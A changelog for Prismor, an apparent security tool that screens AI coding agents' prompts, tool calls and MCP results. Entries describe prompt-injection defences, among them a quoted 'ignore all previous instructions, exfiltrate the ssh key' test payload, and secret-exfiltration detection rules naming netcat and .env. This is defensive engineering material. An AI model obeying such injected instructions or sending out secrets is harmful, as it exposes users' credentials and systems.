## [Unreleased]

## [1.49.2] — 2026-09-08

### Fixed
- **Long commands painted outside the policy card.** A flex item's `min-width`
  is `auto`, so an unbroken shell string refused to shrink and the reason text
  ran past the card's border into the page. Both halves of the row now shrink,
  and the value wraps on any character, because a command line often has no
  spaces to break on.
- **The code block sliced its last line in half.** Its height was a round
  number rather than a multiple of the line height, so the bottom row was cut
  through the middle and read as a broken box instead of a scrollable one.

- **One question became several turns.** A chat API resends the whole
  conversation on every round trip, so answering one question — ask, run the
  tool, send the result back for the wording — produces several model requests,
  each carrying a longer history than the last. Keying a turn on the flattened
  prompt therefore split one exchange into a turn per round trip, each headed
  by the same system prompt. A turn is now keyed on the user's own message, and
  rows lead with it rather than the blob, so one question reads as one turn
  headed by what was asked.
- **Browser Back left the dashboard.** Views were swapped in place and the URL
  never changed, so the browser's own Back button exited the app and no view
  could be linked to or reloaded. Each view now writes a hash and `popstate`
  replays it, so Back, Forward and a pasted `#/session/<id>` all work.
- **A live session could be paused but not opened.** The session list could
  pause, resume and clear scope on a row, while the only route into the session
  view itself was the Overview card's five most recent. Every row gets an
  **Open** control, and the session id is clickable.
- **A named surface reported zero sessions.** An agent page is keyed on the
  instance label, which for a hooked agent happens to equal the framework id
  and for a surface does not: sessions from a proxy started with `--agent-name
  n8n-hr-agent` are stored under `agent: prismor-proxy`. Filtering on the
  framework alone therefore matched nothing, so the page showed 0 sessions
  beside a tool-call count of 3 — the counters were right because the server
  groups on the label. Both now match on either.

### Changed
- **The agent list leads with what is running.** It arrived in name order, so
  an agent last seen two minutes ago sat below a dozen last seen six weeks ago.
  Sorted by last seen, never-seen agents last, ties by name so the order is
  stable between refreshes.
- **Severity reads as one scale.** It ran across four unrelated hues —
  critical in violet, high in pink, medium in yellow, low in blue — so the most
  urgent badge looked the calmest. One ramp now: red, orange, amber, grey. The
  policy card drops its pink fill for a neutral surface with a verdict-coloured
  edge, so a card is a container and the colour means the verdict.
- **Lane icons** from [keyline-icons](https://github.com/keyline-icons/keyline-icons)
  (MIT, 24×24 stroke grid), inlined as a sprite: no request, no dependency.
- Applied the parts of [ui-skills](https://github.com/ibelick/ui-skills)'
  baseline that fit plain CSS: tabular figures for timestamps, no invented
  letter-spacing, and the accent colour used once per view.


## [1.49.1] — 2026-09-08

### Fixed
- **One prompt became three turns.** Claude Code runs a hook registered in both
  the user's `settings.json` and the project's, once each, and gives the
  dispatcher no way to tell the copies apart — so the same message was logged
  more than once and the session view opened a turn for every copy, reading as
  if the person had said it three times. Events with the same type and content
  inside a ten-second window collapse to one, and a repeated prompt no longer
  opens a turn of its own. A genuine repeat — the agent running `ls` twice,
  minutes apart — still shows twice.

### Changed
- **The bundled webfont for code is gone.** Command text and ids now use the
  platform's own monospace stack rather than a downloaded display face, which
  was a strong opinion the dashboard did not need and one more render-blocking
  request on every load. Row chips read in the UI face — they are labels, not
  code.
- Session tree spacing, turn separators and lane labels tightened; the selected
  row now takes the accent colour instead of a flat grey.


## [1.49.0] — 2026-09-08

### Added
- **One proxy session per conversation.** The session id was the proxy's own —
  process start plus pid — so every conversation the surface ever handled piled
  into a single session, which is a log file rather than a session. A chat UI
  sends its whole history every turn, so the opening exchange is the one thing
  constant within a conversation and different between them: hashing it threads
  a chatbot's turns together and keeps two chats apart. A caller that knows its
  own id can send `X-Prismor-Session` (sanitized, not trusted verbatim); a
  request with no conversation falls back to the process session. Snapshots are
  now per session, and every session the process touched is flushed on
  shutdown.
- **The prompt is stored in its parts, not only as a blob.** Policy still reads
  the flattened system-plus-messages text, because the rules that matter are
  category rules over combined text — but that blob is the wrong thing to
  *show*, and the session view was showing it: the message a person typed
  arrived welded to the workflow's system prompt, with no way to tell which was
  which. The event now also carries `user_message` and `system`, and the
  session view leads with what the person actually said.


## [1.48.0] — 2026-09-08

### Added
- **The session view shows what actually happened, not just that something
  did.** A session is now a tree — turn → lane → event — instead of a flat
  chain of nodes: a turn begins at each model request, and lanes (Prompts,
  Tool calls, Shell, Files, Network, Context, MCP) keep two hundred shell
  calls from burying the one file that was written. Expand all / Collapse all,
  and every row still opens the same policy panel.

  Each row now carries its artefacts, which the log had held all along and the
  view had never shown: the full prompt text, what a tool returned, the path
  touched, the command, the model and provider, and — for a session-start
  event — the instruction files that were already in context plus any
  integrity finding against them. A prompt used to render as the word
  "prompt". Captures are bounded per field, with the truncation made visible,
  because the session view is a reading surface and the event log remains the
  record.

### Fixed
- **Every tool call appeared twice.** A hooked agent logs a `PreToolUse` and a
  `PostToolUse` for the same call, and the trail listed both — an unbroken
  column of pairs that reads as a rendering bug. One call is one row now: the
  pre-call phase carries the verdict, the post-call phase contributes what came
  back. A post with no pre inside the window still appears, because the call
  still happened.
- **A session showed its last 60 events and said nothing about the rest.** For
  a session with 1458 of them that is the tail of the tail, and with each call
  double-counted it was really the last 30 calls. The window is 600 events
  fetched and 250 rows rendered after merging.

## [1.47.2] — 2026-09-08

### Changed
- **One `NOTE:` wherever a missing Docker skips the sandbox.** `mode apply`,
  `mode show`, `prismor setup` and the hook path each phrased it differently,
  and none of them led with the thing the reader needs first — that the
  sandbox was *skipped*, not that something failed. All four now say so in one
  wording, and callers key off the `NOTE:` prefix rather than the prose.

  ```
  · NOTE: Docker is not available here (docker CLI not found) — the sandbox
    is skipped. Rules, egress and tag rules still enforce; start Docker and
    re-apply for container isolation.
  ```

### Fixed
- **A Docker-less install reported itself as hand-edited drift.** Skipping the
  sandbox makes the written policy legitimately differ from the catalogue
  mode's compile, and `has_drifted` compared against the undegraded article —
  so `mode show` told every such install "the policy has been hand-edited
  since this mode was applied" the moment it was written. The skip is now
  stamped as provenance (`settings.mode_sandbox_skipped`, the same shape as
  `mode_observe`) and drift is computed against what the policy actually is.

## [1.47.1] — 2026-09-08

### Fixed
- **Every governance mode blocked the first shell command of every session.**
  `SessionStart` scans the workspace's own `CLAUDE.md`/`AGENTS.md` and emits a
  `memory` event, and `memory` counted as `untrusted_content` — so
  `untrusted_content then critical_action -> block` was armed before the user
  typed anything, and the first `Bash` call died. Measured on a clean box:
  `git status`, `ls -la`, `echo hello` and `npm test` were all blocked after a
  bare `SessionStart`, while each of them passed in a session of its own. A
  mode applied cleanly and then nothing worked. `memory` is the same content
  as an in-workspace `file_read`, which the inference set already excludes, so
  tagging it was inconsistent as well as fatal; its content is still scanned
  by the prompt-injection rules and checked against the TOFU baseline, since
  that set only feeds the combination rules. The control the rule exists for
  is untouched and now pinned by a test: `WebFetch` then `Bash` still blocks.

- **A missing container runtime no longer costs you the whole posture.**
  `prismor mode apply dev-safe` refused outright on a host with no Docker,
  leaving the workspace with no policy at all — worse than the posture it
  declined to install. Containment is one axis of a mode, not the mode: the
  sandbox axis now degrades to `observe` with a note naming the cause, and the
  rules, egress allowlist and tag rules land untouched (30 rules enforcing,
  egress still deny-by-default). At tool-call time an unreachable runtime
  warns and keeps screening rather than exiting 2, so a stopped Docker daemon
  no longer bricks every shell command in the session.

  ```
  Applied mode 'dev-safe' → .prismor/policy.yaml
    · no container runtime here (docker CLI not found) — sandbox set to
      observe; rules, egress and tag rules are unaffected.
  ```

- **`prismor setup` installed an enforcing sandbox onto hosts with no Docker.**
  The wizard passed `force=True` to overwrite an existing policy, and `force`
  in `apply_mode` *also* skipped the runtime preflight — so setup wrote
  exactly the configuration the standalone `mode apply` refused, making the
  wizard strictly more dangerous than the command it wraps. `force` now means
  only "overwrite a policy I did not generate".

## [1.47.0] — 2026-09-07

### Added
- **`prismor mode` — three governance postures that compile into the policy
  the engine already reads.** Configuring Prismor meant setting six
  independent axes — enforcement fallback, egress allowlist, tool access, tag
  rules, sandbox ring, step-up gates — each in a different place with its own
  default. Six chances to get it subtly wrong, and the failure is silent: a
  policy that *looks* configured but leaves `egress.default: allow` reads the
  same as one that does not. A mode is a named posture that sets all of them
  at once and compiles into `.prismor/policy.yaml` plus `.prismor/agents.yaml`
  — `PolicyEngine.evaluate` never learns modes exist, so there is no second
  enforcement path to keep in agreement with the first.

  ```bash
  prismor mode list                    # the three, with coverage and friction
  prismor mode explain dev-safe        # the trade, including what it does NOT stop
  prismor mode apply dev-safe          # compile it into .prismor/policy.yaml
  prismor mode apply dev-safe --observe   # same posture, nothing blocks
  prismor mode show                    # what this workspace runs, and any drift
  ```

  | Mode | Assumes | Coverage | Friction |
  |---|---|---|---|
  | `dev-safe` | the repo may be hostile | 31% (25/80) | 9% |
  | `trusted-workspace` | the repo is trusted | 34% (27/80) | 9% |
  | `regulated-airgap` | nothing is trusted | 100% (80/80) | 90% |

  Coverage and friction are both **computed, never asserted** — coverage from
  the live ruleset, friction from a benign corpus of ordinary developer
  commands replayed through each compiled mode in `tests/test_modes.py` — so
  neither can drift into a marketing number. Every mode states its residual
  risk, and `mode explain` gives that the last word, because the failure this
  guards against is somebody adopting a posture they believe is stronger than
  it is. `dev-safe` enforces a Docker sandbox, so `mode apply` refuses it on a
  host with no reachable runtime rather than leaving an agent whose every
  shell command dies. Docs: `docs/cli-reference.md` → Governance modes.

- **`prismor setup` asks which posture you want, not which of 77 rules.**
  Choosing enforce now opens a GOVERNANCE MODE step showing each mode's
  coverage and friction bars, with `e` for the full explain screen including
  residual risk. Picking one skips the rule-by-rule step entirely and compiles
  the mode at install time; `custom` keeps the per-rule picker the wizard has
  always had. A mode that needs an enforcing sandbox on a host with no Docker
  falls back to that mode's observe build rather than installing a policy that
  would deny every command.

### Fixed
- **Tag inference turned the trifecta rule into "no command may follow a
  read".** `untrusted_content` was inferred for every `file_read` and every
  unmapped `tool_result`, so with tag rules enabled `untrusted_content then
  critical_action -> block` fired on read-then-anything: read a file, then
  save a summary, grep, or run the tests — all blocked, on the first shell
  call of the session. The tag now means attacker-*influenceable* input and is
  scoped accordingly: only a read from outside the workspace root, and only a
  `tool_result` the normalizer marked with an `mcp_server`. Nothing that
  matters is lost — `WebFetch` and `WebSearch` are tagged by name, which
  resolves before inference runs. An unresolvable workspace reads as *not*
  external on purpose: guessing "untrusted" where we know the least would
  reinstate the session-ending cliff on every read.

- **`ssh-keygen -C dev@example.com` was screened as egress to example.com.**
  The `user@host:path` scan ran over the whole command string, so any command
  carrying an address-shaped argument produced a destination. It now runs per
  shell segment and skips commands that take an address but open no socket
  (`ssh-keygen`, `ssh-add`, `gpg`, the package managers, and the local `git`
  subcommands). Kept broad otherwise: `git clone`/`fetch`/`push`/`pull` still
  scan, because there `user@host` is exactly the remote being contacted.

## [1.46.0] — 2026-09-07

### Added
- **Prismor runs as a container.** `packaging/docker/` carries an image, an
  entrypoint that enrolls on first boot, and a compose file that stands the
  proxy up beside n8n with its identity and session store on a volume. The
  surfaces that front an agent Prismor cannot hook are long-lived servers, so
  they want a supervisor and a restart policy rather than a shell someone
  remembers to keep open. `PRISMOR_ENROLL_TOKEN` makes the container a device
  in the console; `PRISMOR_AGENT_NAME` is what the per-agent kill switch and
  mode override target; `PRISMOR_WORKSPACE_SCOPE=managed` is required because a
  container has no git remote to claim and would otherwise resolve as personal
  and report nothing. Enrollment failure is not fatal — a proxy that refused to
  start because the control plane was unreachable would take the agent down
  with it. Docs: `docs/deploy-docker.md`.

### Fixed
- **A short proxy session never reached the console.** The session snapshot the
  console and `prismor sessions` read was rebuilt every 25 events — right for
  amortizing a quadratic re-analysis on a long-lived surface, wrong for a
  proxy session that is often a single chat turn. A governed n8n agent whose
  install command was blocked logged five events and produced no session row
  anywhere an operator looks: findings reached the sinks, but the session they
  belonged to did not exist. The snapshot is now flushed on shutdown, on
  SIGTERM as well as SIGINT so a container stop counts, and only when there is
  something unsnapshotted to write.


## [1.45.3] — 2026-09-07

### Fixed
- **`secret-exfiltration` refused ordinary file writes.** Its alternation of
  network verbs was unanchored, so the two-letter netcat alternative matched
  inside any word carrying those letters — `newfunc.py` was enough — and
  `.env` matched inside `os.environ`. A shell command that mentioned both, as
  a heredoc writing a Python file easily does, was blocked as piping a secret
  to an external host, on a floor rule that no policy layer can relax. The
  secret names and the network verbs are now word-anchored, with `https?://`
  kept as its own alternative so a bare URL still counts. Every command the
  rule is meant to stop still blocks, which the new tests pin alongside the
  ordinary ones it should never have touched.


## [1.45.2] — 2026-09-07

### Fixed
- **An OpenAI client's credential test failed against the proxy.** `/v1/models`
  is a path both APIs define and neither route table claims, so it went to the
  default upstream — Anthropic — and an OpenAI SDK got back
  `401 invalid x-api-key`. n8n calls exactly that path behind its **Test**
  button, so the credential reported broken settings while every completion
  through it worked, which is the worst possible first impression of a surface
  whose whole pitch is that nothing else has to change. An unrouted path now
  follows the credential the client presented: `anthropic-version` or
  `x-api-key` means Anthropic, a bearer means OpenAI, and neither still means
  the configured default. Routed paths are unaffected.


## [1.45.1] — 2026-09-07

### Fixed
- **The proxy still refused benign traffic on account of a `CLAUDE.md` it
  should never have read.** 1.45.0 moved its default workspace off cwd, which
  was the right diagnosis and an incomplete fix: the new default lives inside
  `$PRISMOR_HOME`, and $PRISMOR_HOME ships a `CLAUDE.md` of its own -- so the
  instruction-file scan found the same security-project text one directory up
  and went on blocking every request at score 0.91 with
  `source: project_memory`. The scan is now skipped for the proxy entirely.
  It governs an agent it does not host, so instruction files beside its own
  store describe the machine it runs on and say nothing about the traffic it
  is judging; scanning them is not a stricter check, it is a check on the
  wrong subject.

## [1.45.0] — 2026-09-07

### Added
- **`prismor proxy` — the enforcement surface that needs no cooperation from
  the agent.** Every other surface requires something to be hooked, wired or
  imported; this one requires only that model traffic pass through a URL you
  control, so an agent with no hook protocol, no stdio MCP client and no SDK
  is still governed. Two things are screened, on opposite sides of the
  request: the outbound prompt (flattened, evaluated, then cloak-masked, so a
  live credential the agent pulled into context does not land in a third
  party's logs), and **the tool calls the model proposed**. A `tool_use` block
  is not treated as prose — it is reshaped by `mirror.shape_call_event` into
  the same `shell` / `file_read` / `file_write` / `network` event a Bash hook
  produces and run through the same `evaluate_tool_call`, so a rule that stops
  a command at the hook layer also stops the model from *proposing* it, with
  no second rule to write and no second place for the two to disagree.
  Streaming is held at the content-block level: a tool call is buffered from
  `content_block_start` to `content_block_stop`, judged whole, then released
  verbatim or replaced with a refusal at the same block index — the client
  never receives a complete tool call that policy denies. Denied calls are
  replaced rather than deleted, because an agent handed a silent no-op simply
  tries again. Virtual keys let a client present a Prismor key that the proxy
  swaps for the real provider credential, so revoking an agent's access is an
  edit to one file instead of a rotation across every machine that ever ran
  it. Anthropic and OpenAI dialects share one holdback path; unknown paths
  forward untouched so provider handshakes keep working.

  ```bash
  prismor proxy --mode enforce
  ANTHROPIC_BASE_URL=http://127.0.0.1:7080 claude
  OPENAI_BASE_URL=http://127.0.0.1:7080/v1 codex
  ```

  Reach for it when the agent supports nothing else. It is the widest net by
  deployment and the narrowest by visibility — it sees only what the agent
  routes through a model API, so where hooks are available, run hooks. Docs:
  `docs/llm-proxy.md`, including the n8n recipe (a containerised builder with
  no other interposition point, governed by one credential field).

- **`type: otel` telemetry sink** — findings export over OTLP/HTTP to any
  OpenTelemetry collector, so Prismor's decisions land in the observability
  stack a team already runs (Grafana, Honeycomb, Datadog, an OTel-fed SIEM)
  without Prismor knowing which one is downstream. Emitted as *logs*, not
  spans: a finding is a point-in-time detection, not a unit of work with a
  duration. Every field the generic event carries — including runtime extras
  like `agent`, `mode` and `subject` — becomes a `prismor.*` log attribute, so
  the sink does not need updating when the event grows a field. No new
  dependency: OTLP/JSON is a POST, built with the same stdlib `urllib` as the
  webhook and Splunk sinks, and it inherits their best-effort dispatch, so a
  collector that is down warns on stderr and never blocks a tool call.

  ```yaml
  outputs:
    - type: otel
      endpoint: http://localhost:4318        # /v1/logs appended if absent
      headers: { "Authorization": "Bearer ${OTEL_TOKEN}" }
  ```

- **The contextual layer screens what tools return, by default.** The per-tool
  normalizers kept only a call's arguments, so a Claude Code `Read` reached
  the policy engine as `{type: file_read, path}` with the file body dropped —
  the layer was screening filenames on exactly the events where untrusted text
  arrives. `normalize_payload` now attaches the tool's own output as
  `response`, once, for every agent. With that content flowing, the layer is
  on by default in a new `auto` mode: heuristic pre-screen on every event,
  escalating only the uncertain zone to the configured model. `auto` never
  spawns a Claude Code process — measured on a 2-vCPU host, one `claude -p`
  costs 16s with no hooks and 45s once that host's own agent hooks fire on the
  subagent's prompt, past the guard's own 30s timeout. `hybrid` keeps the CLI
  subagent as an explicit opt-in, pinned to Haiku.

- **`WebFetch` is the seventh mirrored built-in, and the mirror wires into
  Claude Desktop.** Fetching the web was the one built-in the mirror left
  native everywhere — fine in Claude Code, where hooks already screen it, and
  not fine in OpenCode, which has no hook protocol at all and whose fetch ran
  unwatched. Screened on the `Read` precedent rather than the native one:
  `network` + url pre-call, so egress rules and the cloaked-secret-in-URL
  check apply unchanged, then `tool_result` post-call so the fetched page goes
  through the injection scan. http/https only — a mirrored tool runs with
  Prismor's filesystem access, so honouring `file://` would turn a screened
  fetch into an unscreened local read. `prismor mirror on --agent
  claude-desktop` wires the desktop app's machine-wide MCP config; unlike
  every other host this *adds* a governed toolset rather than replacing the
  natives, since the app exposes no deny-list, and `on` says so rather than
  letting the install imply coverage it does not have.

- **Telemetry carries the agent's own `tool_use_id`.** One tool call is
  screened more than once — before it runs and again on its result — and each
  pass emits its own record, so with nothing tying them together the console
  drew one `cat` as four nodes in the session graph. The id is opaque and
  agent-generated with no user content, so it ships in redacted mode, and it
  sits outside the chain hash and the signed receipt, so existing verifiers
  are unaffected.

### Fixed
- **Prismor installed on Windows and enforced nothing.** Four bugs, each
  invisible on macOS/Linux, found by running a real Claude Code session on
  Windows Server 2022. Hooks never fired: agent configs store the dispatcher
  as a shell string and cmd.exe has no `VAR=value cmd` syntax, so the
  `PYTHONPATH=... python ...` prefix exited 1 — and hook failure is
  non-blocking, so Prismor reported installed while screening nothing. Setup
  now writes a `hook-dispatch.py` shim and the hook is `"<python>" "<shim>"
  ...`, the one shape sh and cmd.exe agree on. Text I/O without an explicit
  encoding used cp1252 and crashed setup on its own `default_policy.yaml`
  (fixed at 31 call sites) and then on its own spinner glyphs (stdout/stderr
  reconfigured to UTF-8 at the CLI entry point). `fcntl` was imported bare in
  four modules, so every tool call logged `audit trail error: No module named
  'fcntl'` — blocks worked but nothing was recorded; `store.py` now owns one
  guarded import and exposes `file_lock()`. Verified end to end on Windows
  Server 2022 with Claude Code 2.1.250, and CI now runs `prismor setup` on
  windows-latest.

- **`action: warn` hard-blocked under the legacy enforce bridge.**
  `legacy_should_block()` decided purely on a finding's category, never its
  action, so a rule that explicitly declares `action: warn` blocked whenever
  its category appeared in `settings.block_categories`. The bundled default
  policy *is* a legacy policy and 23 of its rules are `action: warn` inside a
  blocking category — so `npm install -g typescript`, appending to `~/.zshrc`
  and opening `package-lock.json` were all denied outright under `--mode
  enforce`. The bridge now filters on `contract.VERDICTS`, matching the
  semantics `contract.py` already states and `PolicyEngine._resolve_mode`
  already applied on the modern path.

- **Self-protection rules fired on reads and on remote hosts.** A rule's
  patterns compile to one alternation applied to every field it names, so
  `agent-config-tampering`'s bare-path forms — meant for a `file_write` path,
  and `$`-anchored — were also tested against `command` and matched anything
  *ending* in that path: `cat`/`ls`/`stat`/`grep` on a settings file were
  denied and reported as modification. Split into two rules, the shell surface
  (now requiring a mutating verb, with `tee` added and `[^\n]*` narrowed to
  `[^\n;&|]*` so the verb governs the path in the same segment) and a new
  `agent-config-tampering-path` for `file_write`, added to both floor
  frozensets. Separately, `prismor-self-edit` fired on `ssh`/`docker`/
  `kubectl`: the `;` inside a remote command's quoted argument satisfied the
  rule's shell-segment anchor, so administering a remote Prismor was blocked
  by the local one, with remediation pointing at the wrong machine.
  `shell_context` grows `is_remote_payload()` and the carve-out is scoped to
  the rules guarding *this* install's own config — a destructive payload aimed
  at a remote host still blocks, which a test asserts.

- **A duplicate `finding_id` silently dropped the whole batch.**
  `persist_runtime_findings` writes the same `"<session>:<rule>-<eventIndex>"`
  id a re-analysis re-derives, and the insert was a bare `INSERT` inside an
  `executemany` — so one collision aborted the entire batch and every *other*
  finding in it was lost, surfacing only as `[prismor] analysis error: UNIQUE
  constraint failed: findings.finding_id`. Now `INSERT OR IGNORE`, so the
  surviving row is the runtime one: replacing it would overwrite its `source:
  runtime` enrichment and reintroduce the vanishing-blocks bug that carve-out
  exists to prevent.

- **The semantic guard's LLM layer either never ran or hung the caller.** The
  Claude CLI was only ever looked for at `~/.local/bin/claude`, so an npm
  install (binary on PATH) silently ran in `heuristic_only` — the one mode
  that cannot explain a paraphrased attack; resolution is now env override,
  then native path, then PATH. And the subagent ran with the caller's cwd, so
  every escalation booted that workspace's MCP servers and hooks, including
  Prismor's own: `subprocess.run`'s timeout killed the CLI but then blocked in
  `communicate()` on pipes the MCP grandchildren still held, so the documented
  30s ceiling was not a ceiling (5s from a neutral directory, still running at
  120s from the workspace). Now `--strict-mcp-config`, a temp cwd, and
  `start_new_session` so a timeout kills the process group.

- **The MCP mirror was treated as a gateway fan-out point.** A `--mirror`
  entry carries no `--config`, so the upstream lookup fell back to
  `~/.prismor/mcp-gateway.json`; on any box that also runs the gateway, the
  mirror inherited servers it never fronted and session scope widened on the
  wrong word — the goal "use cfdocs to look up workers" allowed
  `mcp__prismor-tools__cfdocs__search`. The existing test only caught this
  where a real gateway config happened to exist, so it passed in CI and failed
  on a developer box; the new tests pin both directions with a fake HOME.

- **Cloak's prompt-stash auto-reload never worked on Linux.** `stat -f %m` is
  the BSD form; on GNU coreutils `-f` means `--file-system`, which prints a
  filesystem report *and* exits non-zero, so the `||` fallback also ran and
  the arithmetic aborted the hook under `set -u`. Every `UserPromptSubmit`
  emitted `line 53: File: unbound variable` and the stash the user was told
  would auto-load silently never did.

- **Abandoned sessions were reported as adapter format mismatches.**
  `looks_silent` counted any record, so 10 flagged Claude transcripts holding
  nothing but bookkeeping (`system`, `attachment`, `ai-title`, `mode`,
  `queue-operation`) — sessions opened and abandoned before a single tool call
  — were blamed on the adapter. Adapters now declare their vocabulary via
  `handles()` and silence is measured against claimed records only, so an
  `assistant` record that yields no payload still trips it. Transcripts also
  gained a content-free `skip_reasons` histogram so a reporter can say *which*
  record shape failed without handing over personal transcripts. The same
  corpus surfaced a real miss: Claude stores an assembled prompt (pasted text,
  screenshots) as a content block list rather than a string, and the adapter
  only handled strings — 540 real prompts in 30 days were dropped, and with
  them every injection rule that would have fired on them.

- **The proxy judged the directory it started in.** Its workspace defaulted to
  cwd, so launched from a source checkout — the obvious thing to do while
  testing it — the instruction-file scan read that repo's `CLAUDE.md` and
  attached the result to every event. A security repo whose own docs quote the
  attack strings its rules match therefore refused every request with
  `source: project_memory`: a benign question to a governed n8n agent came back
  `Blocked by Prismor [semantic-guard-hybrid]` at score 0.91. It reads as a
  false positive on the agent and is a true positive on the wrong subject. The
  default is now `$PRISMOR_HOME/surfaces/proxy`; `--workspace` still opts into
  a repo's policy for anyone who means it.

## [1.44.0] — 2026-08-27

### Added
- **`prismor surfaces`** — which enforcement surfaces are actually governing
  this machine, and which could be. Choosing between hooks, the MCP mirror and
  the gateway was already possible; seeing the result was not, and that blind
  spot hid a real bug: `unguarded_agents()` meant "not hooked", so it reported
  an agent the mirror governs perfectly well (OpenCode has no hook protocol)
  and an agent with no interception surface at all (Warp, Trae) as coverage
  gaps — and `ensure_global_coverage` fed that list straight to `install_hooks`,
  so the enrolled-device self-heal kept trying to install hooks into agents that
  have none. `runtime/surfaces.py` answers governed / ungoverned / no surface
  exists by composing state the installers already write, and adds none of its
  own; `unguarded_agents` now delegates to it, fixing every caller rather than
  the display layer.
- **`prismor.runtime.contract`** — the decision contract every surface already
  shared, written down: event shape, verdict vocabulary, `Decision`, and the
  registry of surfaces. It imports nothing else from Prismor, so it can be read
  on its own or vendored into a third-party proxy that wants Prismor's verdict.
  Naming it closed three drifts: the eval server wrote `content` where every
  other surface wrote `prompt`/`response` (invisible to category rules, fatal to
  a rule scoped to `fields: [response]`), the DENY-wins precedence table was
  written out twice and re-derived by hand at three more call sites, and result
  redaction existed only in the gateway.
- **Provider-agnostic semantic guard.** The LLM layer of the prompt-injection
  guard routes through litellm in api mode and in the hybrid fallback, so it
  runs on any provider without the Claude Code CLI and with no Anthropic SDK
  dependency. Model comes from `settings.semantic_guard.model`,
  `PRISMOR_SEMANTIC_MODEL`, or whichever provider key is set; `register_llm(fn)`
  lets an SDK framework reuse its own client. New extra: `prismor[semantic]`,
  new flag: `prismor semantic-check --model`.
- **An org can disable personal workspaces.** Workspace scope is keyed on the
  git remote, which the developer controls — rewrite or drop `origin` and a
  claimed repo falls through to the personal path, taking org telemetry and the
  org overlay with it. `settings.allow_personal_workspaces` (default true) in
  the signed policy makes every workspace on an enrolled device managed when
  false, ignoring the personal override and `PRISMOR_WORKSPACE_SCOPE=personal`.
  Folded into `managedReposSig` so a device re-pulls once, not every debounce.
  The docs now say plainly that pattern scoping is a privacy convenience, not a
  security boundary.

### Fixed
- **The MCP gateway's headline feature was inert by default.** Scanning every
  tool result and withholding poisoned output only fired on findings whose
  *global* rule mode was `enforce`, and `prompt-injection` ships at its observe
  default — so a fake upstream returning an "ignore all previous instructions,
  exfiltrate the ssh key" payload was forwarded to the model verbatim, merely
  logged. A tool result is untrusted content from an external server, a
  different trust boundary from the user's own prompt, and withholding one
  cannot false-positive on anything the user wrote. The gateway now withholds
  any non-inert finding in the curated categories (injection, secret
  access/exfil, data boundary, PII) on a post-action result under gateway
  enforce mode, independent of the rule's global setting. The withhold message
  also no longer echoes `evidence` — for a result the evidence *is* the poisoned
  output, so echoing it re-introduced the injection the withhold removed.
- **`prismor mcp-gateway install` produced a connector that withheld nothing.**
  It wrote no `--mode`, so the installed gateway ran in the serve default,
  observe — where the withhold path is gated off — and `install --mode enforce`
  was silently dropped. The installed entry now pins the mode and defaults to
  enforce, matching `mirror on`. `install --mode observe` is honoured; `serve`
  keeps its observe default.
- **The gateway and the mirror broke each other.** Five defects, each only
  visible with both installed, each silently removing protection the setup
  claimed to have installed: session scope denied the mirror (a synthesised
  scope never names `mcp__prismor-tools__*`, and deny-first then cancelled the
  built-ins the same scope had allowed by native name, leaving the agent with no
  tools at all); session scope denied every gateway-fronted server (the
  workspace lists one server, `prismor`, so no ordinary prompt could ever widen
  to the servers behind it); `mcp-gateway install` absorbed the mirror into its
  own downstream config, nesting a gateway inside a gateway and orphaning every
  permission `mirror on` had just written; and the MCP approval was not carried
  over. Prismor's own entries are now left alone whichever command runs second.
- **`prismor deps` did nothing.** It correlated manifests only against the
  signed advisory feed's `dependency_vulnerability` entries, of which the shipped
  feed has zero — so a manifest pinning a package Prismor itself curates in
  `supplychain/ioc.py` (`mistralai==2.4.6`, `guardrails-ai==0.10.1`, the
  mini-Shai-Hulud npm range) was reported clean. `scan_workspace` now also
  consults the bundled IOC database, independent of the signed feed. An exact
  pip pin is normalised to its concrete version so it reaches the CRITICAL
  exact-range verdict instead of degrading to a name-only HIGH. On the repro
  manifests: 0 → 3 CRITICAL.
- **A cloaked secret reached disk.** `decloak.sh` inlined the resolved value
  into the command string it handed back to Claude Code, which records
  `tool_input.command` verbatim in `~/.claude/projects/*.jsonl`. The raw value
  never reached the model but did reach the transcript. Resolution now happens
  in the child (`decloak-exec.sh`) and the recorded command keeps its
  placeholders; a re-audit shows zero raw-secret occurrences.
- `cloak status` and `cloak audit` looked only at project scope, so a
  global-scope install reported not-installed and raised a CRITICAL no-hooks
  finding while `prismor status` said the opposite. Both now check project and
  user scope.
- `hook_installed()` text-searched for the inline dispatcher marker, which
  openclaw / hermes / opencode never have (they register a plugin path), so
  those agents read as unhooked forever — under-reporting coverage and
  re-triggering `ensure_global_coverage` every run.
- **SDK adapters screened the call but never redacted the result.** A framework
  agent whose tool returned a file with a hardcoded credential in it handed that
  credential straight to the model. Every in-process adapter that holds the
  tool's return value (LangChain/LangGraph, CrewAI, OpenAI Agents, Agno,
  browser-use, Pydantic AI, Semantic Kernel, and AutoGen Core's return leg) now
  passes it through the shared `prismor.runtime.redaction` helper first, and the
  Google ADK adapter gains `make_after_tool_callback()` for the same job.
  Best-effort by contract: masking never raises and never fails a call closed.
  BeeAI and the Claude Agent SDK hook only a pre-action event, so they see no
  output to repair; each now says so where the others document the capability.
  `contract.SURFACES` records `sdk-adapter` as `can_redact=True`.
- Result-side redaction built a whole `PolicyEngine` per string, for an engine
  the caller had just built and parked on `Decision.engine`. The adapters now
  hand it over — not a cache, so nothing goes stale. Measured on a 2-core box,
  median of 200: 8.11 ms → 0.27 ms per result.
- **`prismor scan` produced 265 false HIGH findings on one real repo.** Lockfile
  reachability now follows every edge (nested `node_modules` records, optional
  and peer dependencies, workspace members as BFS seeds, `link: true` symlinks),
  and the manifest walkers agree on one walk that prunes vendored trees, build
  output, caches, agent scratch dirs and nested checkouts — the disagreement is
  what multiplied 53 findings into 265. On two real lockfiles, injection
  findings 77 → 0 and 86 → 0, with genuinely unreachable entries still flagged.
  `scan` now also labels project vs user scope. Closes #289.
- `prismor semantic-check` with no argument on a terminal hung on
  `sys.stdin.read()` until Ctrl-D, with no prompt and no hint — it read as the
  tool being broken. It now prints usage and exits 1 immediately, the same
  pattern `prismor unlock` uses. Piping is unchanged.
- The update notice compared versions with `==`, so for the lifetime of the
  cache after every release every user on the new version was told an *older*
  release was available. It compares numeric release segments now, which also
  fixes 1.9 vs 1.10 ordering.
- `python -m prismor.runtime.cli surfaces` died with
  `NameError: _print_surfaces`. The `__main__` guard sat above the function, and
  `python -m` runs the file top to bottom — so it worked through the console
  script and not through the form the docs use. The guard moved to the end of
  the file, and a test keeps it there.
- The four adapter test modules errored at *collection* (`No module named
  'prismor.langchain'`), six with the framework extras installed — and a
  collection error aborts the whole run, so no adapter test had been running in
  CI at all. `tests/conftest.py` extends `prismor.__path__` with each bundled
  adapter shim, which is what the installed wheel layout does anyway.

### Security
